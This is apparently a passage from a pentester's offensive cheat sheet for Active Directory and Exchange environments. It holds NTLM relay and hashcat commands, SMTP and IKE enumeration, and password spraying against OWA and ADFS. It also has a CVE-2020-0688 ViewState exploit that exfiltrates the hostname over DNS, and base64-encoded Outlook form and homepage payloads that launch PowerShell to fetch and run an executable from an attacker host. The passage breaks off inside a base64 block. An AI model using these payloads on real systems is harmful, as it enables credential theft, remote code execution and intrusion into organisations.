<Username>:<Domain>:<LMv1_Response>:<NTv1_Response>:<Server_Challenge>
```

`[SMB] NTLMv2-SSP Hash` capture structure:

```
<Username>:<Domain>:<Server_Challenge>:<LMv2_Response>:<NTv2_Response>
```

* [https://github.com/lgandx/Responder/blob/eb449bb061a8eb3944b96b157de73dea444ec46b/servers/SMB.py#L149](https://github.com/lgandx/Responder/blob/eb449bb061a8eb3944b96b157de73dea444ec46b/servers/SMB.py#L149)
* [https://ru.wikipedia.org/wiki/NTLMv2#NTLMv2](https://ru.wikipedia.org/wiki/NTLMv2#NTLMv2)
* [https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/](https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/)
* Andrei Miroshnikov. Windows Security Monitoring: Scenarios and Patterns, Part III, pp. 330-333.




## NTLM Relay

* [https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://www.secureauth.com/blog/playing-with-relayed-credentials/](https://www.secureauth.com/blog/playing-with-relayed-credentials/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/](https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* [https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire](https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire)
* [https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/](https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/)
* [https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/](https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/)
* [https://luemmelsec.github.io/Relaying-101/](https://luemmelsec.github.io/Relaying-101/)
* [[PDF] Lateral Movement using Credentials Relaying (taso_x)](https://drive.google.com/file/d/1t8akbdgan7i9Rw0tFEIP223CmHFlTRCH/view?usp=sharing)

Generate relay list with cme and enumerate local admins when relaying

```
$ cme smb 192.168.2.0/24 --gen-relay-list out.txt
$ sudo ntlmrelayx.py -smb2support --no-http-server -tf out.txt --enum-local-admins -of net-ntlmv2
```





# Password Brute Force




## hashcat

```
$ hashcat --example-hashes | grep -B1 -i md5
$ hashcat -m 500 hashes/file.hash /usr/share/wordlists/rockyou.txt --username
$ hashcat -m 500 hashes/file.hash --username --show
```

Benchmarks:

```
$ nvidia-smi.exe

 # MD5
$ hashcat -m 0 -b
 # NTLM
$ hashcat -m 1000 -b
```

| Единица хэшрейта  |           Хэшрейт             | Хэши в секунду  |
|-------------------|-------------------------------|-----------------|
| 1kH/s             |                          1000 | Тысяча          |
| 1MH/s             |                       1000000 | Одинмиллион     |
| 1GH/s             |                    1000000000 | Одинмиллиард    |
| 1TH/s             |             1.000.000.000.000 | Одинтриллион    |
| 1PH/s             |         1.000.000.000.000.000 | Одинквадриллион |
| 1EH/s             |     1.000.000.000.000.000.000 | Одинквинтиллион |
| 1ZH/s             | 1.000.000.000.000.000.000.000 | Одинсекстиллион |





# Perimeter

* [https://pentest-tools.com/home](https://pentest-tools.com/home)
* [https://hackertarget.com/ip-tools/](https://hackertarget.com/ip-tools/)

* DNS
	+ `$ nslookup example.com`
	+ Subdomains & AXFR
	+ AS details
	+ $ `whois example.com`
	+ $ `whois 127.0.0.1`
	+ Check for DNS Amplification
* CMS, Stack, Vulns
	+ WhatWeb, Wappalyzer
	+ Shodan / Censys / SecurityTrails
* Google Dorks
	+ `/robots.txt`
	+ `/sitemap.xml`




## Autonomous Systems

* [https://hackware.ru/?p=9245](https://hackware.ru/?p=9245)



### Info via IP

dig:

```
$ dig $(dig -x 127.0.0.1 | grep PTR | tail -n 1 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}').origin.asn.cymru.com TXT +short
```

whois:

```
$ whois -h whois.cymru.com -- '-v 127.0.0.1'
$ whois -h whois.radb.net 127.0.0.1
```



### Info via ASN

whois:

```
$ whois -h whois.cymru.com -- '-v AS48666'
$ whois -h whois.radb.net AS48666
```



### Search AS

* [https://radar.qrator.net/search?query=AS31337](https://radar.qrator.net/search?query=AS31337)
* [https://github.com/nitefood/asn](https://github.com/nitefood/asn)

Map IP addresses to AS by origin and netname with ignoring potentionally unwanted netname values by keywords:

```bash
 #!/bin/bash
 # Usage: whois.sh ip_list.txt

for ip in `cat $1`; do
  ASNUM=`whois $ip | grep -i "origin:" | tr -d ' ' | cut -d ":" -f 2 | tr $'\n' ','`
  NETNAME=`whois $ip | grep -i "netname:" | tr -d ' ' | cut -d ":" -f 2`
  if ! echo "$NETNAME" | grep -iqF -e pppoe -e ipoe; then
    echo "$ASNUM,$NETNAME,$ip"
   fi
done
```

Difference between as-name, aut-num, origin, netname, etc. may be found on [RIPE](https://www.ripe.net/manage-ips-and-asns/db/support/documentation/ripe-database-documentation/@@fullbodyrecursive-view).




## NTP



### NTP Amplification

Check:

```
$ ntpq -c rv 10.10.13.37
```




## DNS



### whois

IP/domain info, IP ranges:

```
$ whois [-h whois.example.com] example.com или 127.0.0.1
```



### dig

General:

```
$ dig [@dns.example.com] example.com [{any,a,mx,ns,soa,txt,...}]
$ dig -x example.com [+short] [+timeout=1]
```

* [https://viewdns.info/reverseip/](https://viewdns.info/reverseip/)

Zone transfer:

```
$ dig axfr @dns.example.com example.com
$ for srv in `cat dns.txt`; do dig axfr "@$srv" example.com | grep "failed" > /dev/null 2>&1 || echo $srv; done
```



### nslookup

```
$ nslookup example.com [ns.example.com]
$ nslookup -type=ptr 127.0.0.1

$ nslookup
[> server dns.example.com]
> set q=mx
> example.com

$ nslookup
> set q=ptr
> 127.0.0.1
```



### DNS Amplification

Check:

```
$ host facebook.com ns.example.com

$ dig +short @ns.example.com test.openresolver.com TXT
$ for srv in `cat dns.txt`; do dig +short @$srv test.openresolver.com TXT | grep "open-resolver-detected" && echo $srv; done

$ sudo nmap -Pn -sU -sV --script dns-recursion ns.example.com -p53
$ for srv in `cat dns.txt`; do sudo nmap -Pn -sU -sV --script dns-recursion $srv -p53 | grep "enabled" && echo $srv; done

msf > auxiliary/scanner/dns/dns_amp
```




## SMTP

Check if sender could be [forged](https://en.wikipedia.org/wiki/Callback_verification) with an domain user:

```
$ telnet mail.example.com 25
HELO example.com
MAIL FROM: <forged@example.com>
RCPT TO: <exists@example.com>
RCPT TO: <exists@gmail.com>
```

Check if sender could be forged with a non-domain user:

```
$ telnet mail.example.com 25
HELO example.com
MAIL FROM: <forged@gmail.com>
RCPT TO: <exists@example.com>
RCPT TO: <exists@gmail.com>
```

Check if domain users could be enumerated with `VRFY` and `EXPN`:

```
$ telnet mail.example.com 25
HELO example.com
VRFY exists@example.com
EXPN exists@example.com
```

Check if users could be enumerated with `RCPT TO`:

```
$ telnet mail.example.com 25
HELO example.com
MAIL FROM: <...>
RCPT TO: <exists@example.com>
DATA
From: <...>
To: <exists@example.com>
Subject: Job offer
Hello, I would like to offer you a great job!
.
QUIT
```



### RCPT

* [https://github.com/z0mbiehunt3r/smtp-enum](https://github.com/z0mbiehunt3r/smtp-enum)

```
$ ./main.py -d megacorp.com -s 10.10.13.37 -f accounts.txt -m rcptto -o valid.txt
```




## IPSec



### IKE

* [https://xakep.ru/2015/05/13/ipsec-security-flaws/](https://xakep.ru/2015/05/13/ipsec-security-flaws/)
* [https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting](https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting)
* [https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/)
* [https://github.com/SpiderLabs/ikeforce](https://github.com/SpiderLabs/ikeforce)


#### Get Transform Set

Using `ikeforce.py`:

```
$ sudo python ikeforce.py 10.10.13.37 -a
```

Using ike-scan via brute force. Generate list of all transform-sets:

```
$ for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "$ENC,$HASH,$AUTH,$GROUP" >> trans-dict.txt; done; done; done; done
```

Brute force supported transform-sets:

```
$ while read t; do (echo "[+] Valid trans-set: $t"; sudo ike-scan -M --trans=$t 10.10.13.37) |grep -B14 "1 returned handshake" |grep "Valid trans-set" |tee -a trans.txt; done < trans-dict.txt
Or (for aggressive mode)
$ while read t; do (echo "[+] Valid trans-set: $t"; sudo ike-scan -M -A -P'handshake.txt' -n FAKEID --trans=$t 10.10.13.37) |grep -B7 "SA=" |grep "Valid trans-set" |tee -a trans.txt; done < trans-dict.txt
Or
$ sudo python ikeforce.py -s1 -a 10.10.13.37  # -s1 for max speed
```


#### Get Vendor Info

Get information about vendor:

```
$ sudo ike-scan -M --showbackoff [--trans=<TRANSFORM-SET>] 10.10.13.37
```


#### Test for Aggressive Mode

Test for aggressive mode ON:

```
$ sudo ike-scan -M -A -P -n FAKEID [--trans=<TRANSFORM-SET>] 10.10.13.37
```


#### Brute Force Group ID

If no hash value is returned then brute force is (maybe also) possible:

```
$ while read id; do (echo "[+] Valid ID: $id" && sudo ike-scan -M -A -n $id --trans=<TRANSFORM-SET> 10.10.13.37) | grep -B14 "1 returned handshake" | grep "Valid ID" |tee -a group-id.txt; done < dict.txt
Or
$ sudo python ikeforce.py 10.10.13.37 -e -w wordlists/groupnames.dic -t <TRANSFORM-SET-IN-SEPARATE-ARGS>
```

Dictionaries:

* `/usr/share/seclists/Miscellaneous/ike-groupid.txt`
* `~/tools/ikeforce/wordlists/groupnames.dic`




## Exchange

* [https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)



### GAL


#### Ruler

```
$ ./ruler -k -d megacorp.com -u snovvcrash -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose abk dump -o gal.txt
```


#### MailSniper

```
PS > Get-GlobalAddressList -ExchHostname mail.megacorp.com -UserName MEGACORP\snovvcrash -Password 'Passw0rd!' -OutFile gal.txt
```


#### OAB

Search for `<OABUrl>` node using Burp:

```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: mx.megacorp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Authorization: Basic TUVHQUNPUlBcc25vdnZjcmFzaDpQYXNzdzByZCEK
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 350

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>snovvcrash@megacorp.com</EMailAddress>
      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```

Or with a Python [script](https://gist.github.com/snovvcrash/4e76aaf2a8750922f546eed81aa51438):

```
$ ./oaburl.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -e 'existent.email@megacorp.com'
[*] Authenticated users's SID (X-BackEndCookie): S-1-5-21-3167813660-1240564177-918740779-3102
[+] DisplayName: Sam Freeside
[+] Server: 00ff00ff-00ff-00ff-00ff-00ff00ff00ff@megacorp.com
[+] AD: dc01.megacorp.com
[+] OABUrl: https://mx.megacorp.com/OAB/<OABUrl>/
```

Get oab.xml and then gal.lzx:

```
$ curl -k --ntlm -u 'MEGACORP\snovvcrash:Passw0rd!' https://mx.megacorp.local/OAB/<OABUrl>/oab.xml > oab.xml
$ cat oab.xml | grep '.lzx' | grep data
$ curl -k --ntlm -u 'MEGACORP\snovvcrash:Passw0rd!' https://mx.megacorp.local/OAB/<OABUrl>/11ff11ff-11ff-11ff-11ff-11ff11ff11ff-data-999.lzx > gal.lzx
```

Install libmspack:

```
$ git clone https://github.com/kyz/libmspack ~/tools/libmspack && cd ~/tools/libmspack/libmspack
$ sudo apt install autoconf libtool -y
$ ./rebuild.sh && ./configure && make && cd -
```

Parse gal.lzx into gal.oab and extract emails from gal.oab with a regexp:

```
$ ~/tools/libmspack/libmspack/examples/oabextract gal.lzx gal.oab
$ strings gal.oab | egrep -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" | sort -u > emails.txt
```



### ActiveSync


#### PEAS

* [https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/](https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/)
* [https://labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/](https://labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/)
* [https://github.com/FSecureLABS/peas](https://github.com/FSecureLABS/peas)
* [https://github.com/snovvcrash/peas](https://github.com/snovvcrash/peas)

Install:

```
$ git clone https://github.com/snovvcrash/peas ~/tools/peas-m && cd ~/tools/peas-m
$ python3 -m virtualenv --python=/usr/bin/python venv && source venv/bin/activate
(venv) $ pip install --upgrade 'setuptools<45.0.0'
(venv) $ pip install -r requirements.txt
```

Run:

```
$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --check
$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --list-unc='\\DC01'
$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --list-unc='\\DC01\SYSVOL\megacorp.com'
$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --dl-unc='\\DC01\share\file.txt'
$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --dl-unc='\\DC01\share\file.txt' -o file.txt
$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --crawl-unc='\\DC01\share\' [--pattern xml,ini] [--download]
$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --brute-unc [--prefix srv]
```


#### How-To

1\. Use Nmap `http-ntlm-info` to get NetBIOS domain name and Exchange hostname: hunting for hostname pattern prefix if there is one.

2\. Locate DC (guess it trying hostname pattern prefix) and mirror `\\DC01\SYSVOL\megacorp.local\` share with `--crawl-unc` function:

```
$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --crawl-unc='\\DC01\SYSVOL\megacorp.com\' --download
```

3\. Find, xargs and grep for keywords in files: `password`, NetBIOS domain name (for additional account names), hostname pattern prefix (for additional hosts/shares):

```
$ find . -type f -print0 | xargs -0 grep -v PolicyDefinitions | grep -i -e password -e pass
$ find . -type f -print0 | xargs -0 grep -v PolicyDefinitions | grep -i <DOMAIN_NETBIOS_NAME>
$ find . -type f -print0 | xargs -0 grep -v PolicyDefinitions | grep -i <PREFIX>
```

4\. (optional) Brute other share names:

```
$ python -m peas --brute-unc -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com [--prefix srv]
```



### CVE-2020-0688

* [https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
* [https://github.com/pwntester/ysoserial.net/releases](https://github.com/pwntester/ysoserial.net/releases)
* [https://github.com/MrTiz9/CVE-2020-0688](https://github.com/MrTiz9/CVE-2020-0688)

```
Get ViewStateUserKey: Browser → F12 → Storage → ASP.NET_SessionId
Get ViewStateGenerator: Browser → F12 → Console → document.getElementById("__VIEWSTATEGENERATOR").value
PS > [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$name = hostname;nslookup "$name.0000000000ffffffffff.d.zhack.ca"'))
PS > .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -exec bypass -enc <BASE64_CMD>" --validationalg "SHA1" --validationkey "CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --viewstateuserkey "<VIEWSTATE>" --generator "<GENERATOR>" --islegacy --isdebug
https://mx.megacorp.com/ecp/default.aspx?__VIEWSTATEGENERATOR=<GENERATOR>&__VIEWSTATE=<VIEWSTATE>
```



### NSPI

* [https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
* [https://github.com/ptswarm/impacket](https://github.com/ptswarm/impacket)

* `>= Impacket v0.9.22.dev1+20200819.170651.b5fa089b`

List Address Books and count entities in every one of them:

```
$ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi list-tables -count
```

Dump any specified Address Book by its name or GUID:

```
$ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi dump-tables -guid 00ff00ff-00ff-00ff-00ff-00ff00ff00ff -lookup-type EXTENDED -output-file gal.txt
$ cat gal.txt | grep 'mail,' | sort -u | awk -F' ' '{print $3}' > emails.txt
```

Return AD objects by their GUIDs:

```
PS > (Get-ADuser -Identity snovvcrash).ObjectGUID
$ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi guid-known -guid 00ff00ff-00ff-00ff-00ff-00ff00ff00ff -lookup-type FULL
```

Dump all AD records via requesting DNTs:

```
$ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi dnt-lookup -lookup-type EXTENDED -start-dnt 0 -stop-dnt 500000 -output-file dnt-dump.txt
```




## ADFS



#### ADFSpray

* [https://github.com/xFreed0m/ADFSpray](https://github.com/xFreed0m/ADFSpray)

Spray at autodiscover (NTLM auth) endpoint:

```
$ python3 ADFSpray.py -U users.txt -p 'Passw0rd!' -t 'https://autodiscover.megacorp.com/autodiscover/autodiscover.xml' autodiscover
```


#### adfsbrute

* [https://github.com/ricardojoserf/adfsbrute](https://github.com/ricardojoserf/adfsbrute)




##  OWA



### Enumerate Users

* [https://www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/](https://www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/)
* [https://www.intruder.io/blog/user-enumeration-in-microsoft-products-an-incident-waiting-to-happen](https://www.intruder.io/blog/user-enumeration-in-microsoft-products-an-incident-waiting-to-happen)


#### MailSniper

```
PS > Invoke-UsernameHarvestOWA -ExchHostname mx.megacorp.com -Domain MEGACORP -UserList .\owa-users.txt -Threads 25 -OutFile owa-valid-users.txt
```



### Password Spray


#### Ruler

* [https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials](https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials)

Autodiscover URL implicit:

```
$ ./ruler -k -d megacorp.com brute --users users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a ruler-blood.out
```

Autodiscover URL explicit:

```
$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com brute --users users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a ruler-all.out
```

Notes:

* In users.txt there's only "username" on a line, not "DOMAIN\username".
* Errors like `ERROR: 04:27:43 brute.go:193: An error occured in connection - Get https://autodiscover.megacorp.com/autodiscover/autodiscover.xml: Get https://autodiscover.megacorp.com/autodiscover/autodiscover.xml: net/http: request canceled` do **not** affect the current password probe.



### Parse NTLM

* [https://github.com/nyxgeek/ntlmscan](https://github.com/nyxgeek/ntlmscan)
* [https://gist.github.com/aseering/829a2270b72345a1dc42](https://gist.github.com/aseering/829a2270b72345a1dc42)


#### Nmap

```
$ sudo nmap -sV --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 mx.megacorp.com
```


#### Metasploit

```
msf > use auxiliary/scanner/http/owa_login
```


#### MailSniper

```
PS > Invoke-DomainHarvestOWA -ExchHostname mx.megacorp.com
```


#### get_ad_domain.zip

```
$ python get_ad_domain.zip -m owa mx.megacorp.com
```




## Outlook



### Ruler

* [https://github.com/sensepost/ruler/releases](https://github.com/sensepost/ruler/releases)


#### Rules

* [https://github.com/sensepost/ruler/wiki/Rules](https://github.com/sensepost/ruler/wiki/Rules)
* [https://silentbreaksecurity.com/malicious-outlook-rules/](https://silentbreaksecurity.com/malicious-outlook-rules/)


#### Forms

* [https://github.com/sensepost/ruler/wiki/Forms](https://github.com/sensepost/ruler/wiki/Forms)
* [https://sensepost.com/blog/2017/outlook-forms-and-shells/](https://sensepost.com/blog/2017/outlook-forms-and-shells/)

Display forms:

```
$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form display
```

Exploit:

```
$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form add --suffix test-form --input vbs-payload.txt --send
```

```(vbs-payload.txt.b64)
Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuICJwb3dlcnNoZWxsIC1leGVjIGJ5cGFzcyAtZW5jIEpBQndBSElBYndCNEFIa0FRUUJrQUdRQWNnQTlBQ2dBUndCbEFIUUFMUUJKQUhRQVpRQnRBRkFBY2dCdkFIQUFaUUJ5QUhRQWVRQWdBQ0lBU0FCTEFFTUFWUUE2QUZ3QVV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QVRRQnBBR01BY2dCdkFITUFid0JtQUhRQVhBQlhBR2tBYmdCa0FHOEFkd0J6QUZ3QVF3QjFBSElBY2dCbEFHNEFkQUJXQUdVQWNnQnpBR2tBYndCdUFGd0FTUUJ1QUhRQVpRQnlBRzRBWlFCMEFDQUFVd0JsQUhRQWRBQnBBRzRBWndCekFDSUFLUUF1QUZBQWNnQnZBSGdBZVFCVEFHVUFjZ0IyQUdVQWNnQTdBQ1FBY0FCeUFHOEFlQUI1QUQwQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBRk1BZVFCekFIUUFaUUJ0QUM0QVRnQmxBSFFBTGdCWEFHVUFZZ0JRQUhJQWJ3QjRBSGtBT3dBa0FIQUFjZ0J2QUhnQWVRQXVBRUVBWkFCa0FISUFaUUJ6QUhNQVBRQWtBSEFBY2dCdkFIZ0FlUUJCQUdRQVpBQnlBRHNBSkFCd0FISUFid0I0QUhrQUxnQlZBSE1BWlFCRUFHVUFaZ0JoQUhVQWJBQjBBRU1BY2dCbEFHUUFaUUJ1QUhRQWFRQmhBR3dBY3dBOUFDUUFkQUJ5QUhVQVpRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQVBRQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQk9BR1VBZEFBdUFGY0FaUUJpQUVNQWJBQnBBR1VBYmdCMEFEc0FKQUJqQUd3QWFRQmxBRzRBZEFBdUFGQUFjZ0J2QUhnQWVRQTlBQ1FBY0FCeUFHOEFlQUI1QURzQUpBQmpBR3dBYVFCbEFHNEFkQUF1QUVRQWJ3QjNBRzRBYkFCdkFHRUFaQUJHQUdrQWJBQmxBQ2dBSWdCb0FIUUFkQUJ3QURvQUx3QXZBREVBTUFBdUFERUFNQUF1QURFQU13QXVBRE1BTndBdkFHZ0FkQUIwQUhBQWN3QTBBRFFBTXdBdUFHVUFlQUJsQUNJQUxBQWlBQ1FBWlFCdUFIWUFPZ0IxQUhNQVpRQnlBSEFBY2dCdkFHWUFhUUJzQUdVQVhBQnRBSFVBY3dCcEFHTUFYQUJvQUhRQWRBQndBSE1BTkFBMEFETUFMZ0JsQUhnQVpRQWlBQ2tBT3dBa0FHVUFlQUJsQUdNQVBRQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBTFFCakFHOEFiUUFnQUhNQWFBQmxBR3dBYkFBdUFHRUFjQUJ3QUd3QWFRQmpBR0VBZEFCcEFHOEFiZ0E3QUNRQVpRQjRBR1VBWXdBdUFITUFhQUJsQUd3QWJBQmxBSGdBWlFCakFIVUFkQUJsQUNnQUlnQWtBR1VBYmdCMkFEb0FkUUJ6QUdVQWNnQndBSElBYndCbUFHa0FiQUJsQUZ3QWJRQjFBSE1BYVFCakFGd0FhQUIwQUhRQWNBQnpBRFFBTkFBekFDNEFaUUI0QUdVQUlnQXBBQW9BIiwgMCwgZmFsc2UK
```

Cleanup:

```
$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form delete --suffix test-form
```

Empire stager encryption:

```
$ grep -e output_type -e payload_type -e clean_output -e userdomain genetic.config
    output_type = GO
    payload_type = DLL_x64
    clean_output = True
        userdomain = 'MEGACORP'
$ python ebowla.py https443.dll genetic.config
$ ./build_x64_go.sh output/go_symmetric_https443.dll.go https443.exe --hidden
```


#### Homepage

* [https://github.com/sensepost/ruler/wiki/Homepage](https://github.com/sensepost/ruler/wiki/Homepage)
* [https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)

Exploit:

```
$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage add --url http://10.10.13.37/homepage.html
```

```(homepage.html.b64)
PGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyI+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXdpbmRvd3MtMTI1MiI+Cjx0aXRsZT5PdXRsb29rPC90aXRsZT4KPHNjcmlwdCBpZD1jbGllbnRFdmVudEhhbmRsZXJzVkJTIGxhbmd1YWdlPXZic2NyaXB0Pgo8IS0tCiBTdWIgd2luZG93X29ubG9hZCgpCiAgICAgU2V0IEFwcGxpY2F0aW9uID0gVmlld0N0bDEuT3V0bG9va0FwcGxpY2F0aW9uCiAgICAgU2V0IGNtZCA9IEFwcGxpY2F0aW9uLkNyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpCiAgICAgY21kLlJ1bigicG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgLWUgSkFCd0FISUFid0I0QUhrQVFRQmtBR1FBY2dBOUFDZ0FSd0JsQUhRQUxRQkpBSFFBWlFCdEFGQUFjZ0J2QUhBQVpRQnlBSFFBZVFBZ0FDSUFTQUJMQUVNQVZRQTZBRndBVXdCdkFHWUFkQUIzQUdFQWNnQmxBRndBVFFCcEFHTUFjZ0J2QUhNQWJ3Qm1BSFFBWEFCWEFHa0FiZ0JrQUc4QWR3QnpBRndBUXdCMUFISUFjZ0JsQUc0QWRBQldBR1VBY2dCekFHa0Fid0J1QUZ3QVNRQnVBSFFBWlFCeUFHNEFaUUIwQUNBQVV3QmxBSFFBZEFCcEFHNEFad0J6QUNJQUtRQXVBRkFBY2dCdkFIZ0FlUUJUQUdVQWNnQjJBR1VBY2dBN0FDUUFjQUJ5QUc4QWVBQjVBRDBBVGdCbEFIY0FMUUJQQUdJQWFnQmxBR01BZEFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBVGdCbEFIUUFMZ0JYQUdVQVlnQlFBSElBYndCNEFIa0FPd0FrQUhBQWNnQnZBSGdBZVFBdUFFRUFaQUJrQUhJQVpRQnpBSE1BUFFBa0FIQUFjZ0J2QUhnQWVRQkJBR1FBWkFCeUFEc0FKQUJ3QUhJQWJ3QjRBSGtBTGdCVkFITUFaUUJFQUdVQVpnQmhBSFVBYkFCMEFFTUFjZ0JsQUdRQVpRQnVBSFFBYVFCaEFHd0Fjd0E5QUNRQWRBQnlBSFVBWlFBN0FDUUFZd0JzQUdrQVpRQnVBSFFBUFFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQURzQUpBQmpBR3dBYVFCbEFHNEFkQUF1QUZBQWNnQnZBSGdBZVFBOUFDUUFjQUJ5QUc4QWVBQjVBRHNBSkFCakFHd0FhUUJsQUc0QWRBQXVBRVFBYndCM0FHNEFi